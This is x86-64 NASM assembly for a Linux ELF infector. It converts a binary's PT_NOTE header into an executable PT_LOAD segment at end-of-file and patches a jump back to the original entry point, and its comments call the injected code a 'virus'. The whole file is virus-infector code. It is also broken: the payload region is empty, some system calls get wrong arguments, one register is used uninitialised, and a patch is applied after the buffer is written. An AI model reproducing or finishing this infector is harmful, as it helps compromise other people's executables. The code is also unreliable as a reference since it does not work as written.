section .bss
buffer resb 10000            ; Reserve 10KB for the ELF file
statbuf resb 144             ; Reserve space for struct stat (144 bytes)

section .text
global _start

v_start:
    
v_stop:

_start:
    ; -------- Parse command line arguments --------
    mov rdi, [rsp + 16]       ; argv[1] (path to ELF file)
    test rdi, rdi
    jz exit_usage

    ; -------- Open the file --------
    mov rax, 2                ; sys_open
    mov rsi, 2                ; O_RDWR (Read + Write)
    syscall
    cmp rax, 0
    js exit_error
    mov rdi, rax              ; Save file descriptor

    ; -------- Retrieve file metadata (fstat) --------
    lea rsi, [statbuf]        ; Pointer to statbuf
    mov rax, 5                ; sys_fstat
    syscall
    cmp rax, 0
    js exit_error

    ; -------- Read file into buffer --------
    lea rsi, [buffer]         ; Address of buffer
    mov rdx, 10000            ; Buffer size
    mov rax, 0                ; sys_read
    syscall
    cmp rax, 0
    js exit_error
    mov rbx, rax              ; Save number of bytes read
    mov r15, buffer           ; r15 = base of the ELF buffer
    
    mov r14, [r15 + 0x18]         ; r14 now holds the original e_entry value
    
    ; -------- Parse Program Header Table --------
parse_phdr:
    xor rcx, rcx              ; rcx = 0 (counter for entries)
    xor rdx, rdx              ; Store entry size

    mov cx, word [r15 + 0x38] ; e_phnum: Number of program headers
    mov rbx, qword [r15 + 0x20] ; e_phoff: Offset of program header table
    mov dx, word [r15 + 0x36] ; e_phentsize: Size of each program header

    lea rbx, [r15 + rbx]      ; rbx = Address of first program header

loop_phdr:
    cmp rcx, 0
    jle phdr_not_found

    mov eax, dword [rbx + 0x00] ; e_phdr.type
    cmp eax, 0x4              ; Check for PT_NOTE
    je pt_note_found

    add rbx, rdx              ; Move to next Program Header
    dec rcx
    jmp loop_phdr

pt_note_found:
    ; -------- Modify PT_NOTE to PT_LOAD --------
    mov dword [rbx + 0x00], 0x1   ; Change p_type to PT_LOAD (1)
    mov dword [rbx + 0x04], 0x5   ; Set p_flags to PF_X | PF_R (0x5)

    mov rax, [r15 + 48]           ; Load stat.st_size
    add rax, 0xc000000            ; Add high memory offset
    mov qword [rbx + 0x10], rax   ; Set p_vaddr
    mov qword [rbx + 0x18], rax   ; Set p_paddr

    ; Write changes back to file
    mov rdi, [rsp + 16]       ; argv[1] (file path)
    mov rax, 2                ; sys_open
    mov rsi, 1                ; O_WRONLY (Write only)
    syscall
    mov rdi, rax              ; File descriptor

    lea rsi, [buffer]         ; Modified buffer
    mov rdx, 10000            ; Write back 10KB
    mov rax, 1                ; sys_write
    syscall
    
    mov rax, 8                   ; SYS_LSEEK
    mov rdi, [rsp + 16]          ; File descriptor (passed as argument)
    xor rsi, rsi                 ; Offset = 0
    mov rdx, 2                   ; SEEK_END
    syscall                      ; rax = EOF offset
    push rax                     ; Save EOF offset on the stack

    ; -------- Update p_offset to Point to EOF --------
    pop rax                      ; Restore EOF offset into rax
    mov qword [rbx + 0x08], rax  ; Set p_offset (phdr.offset) to EOF

    ; -------- Adjust p_filesz (Size on Disk) --------
    mov rdx, v_stop - v_start + 5  ; Calculate virus size + 5 bytes for jmp
    add qword [rbx + 0x20], rdx  ; Increment p_filesz by virus size + 5

    ; -------- Adjust p_memsz (Size in Memory) --------
    add qword [rbx + 0x28], rdx  ; Increment p_memsz by virus size + 5

    ; -------- Set p_align --------
    mov qword [rbx + 0x30], 0x200000 ; Set p_align to 2MB (0x200000)

    
write_patched_jmp:
    ; Step 1: Get the target EOF offset for where the code will be patched
    mov rdi, r9                ; r9 contains the file descriptor
    mov rsi, 0                 ; Offset = 0
    mov rdx, 2                 ; SEEK_END (start at end of file)
    mov rax, 8                 ; sys_lseek
    syscall                    ; rax contains EOF offset

    ; Step 2: Prepare the patched jmp
    mov rdx, [rbx + 0x10]      ; rdx = p_vaddr (virtual address of injected segment)
    add rdx, 5                 ; Increment by the size of the JMP instruction (5 bytes)
    sub r14, rdx               ; r14 = e_entry - (p_vaddr + 5)
    sub r14, v_stop - v_start  ; Adjust r14 by subtracting the size of injected code

    ; Step 3: Write the JMP instruction at the end of the injected code
    mov byte [r15 + 300], 0xe9 ; Write the opcode for JMP (0xE9)
    mov dword [r15 + 301], r14d; Write the 32-bit relative offset to the original entry
    
    ; -------- Exit Normally --------
    mov rax, 60               ; sys_exit
    xor rdi, rdi
    syscall

phdr_not_found:
    mov rax, 60               ; sys_exit
    mov rdi, 2
    syscall

exit_usage:
    mov rax, 60               ; sys_exit
    mov rdi, 1
    syscall

exit_error:
    mov rax, 60               ; sys_exit
    mov rdi, 3
    syscall

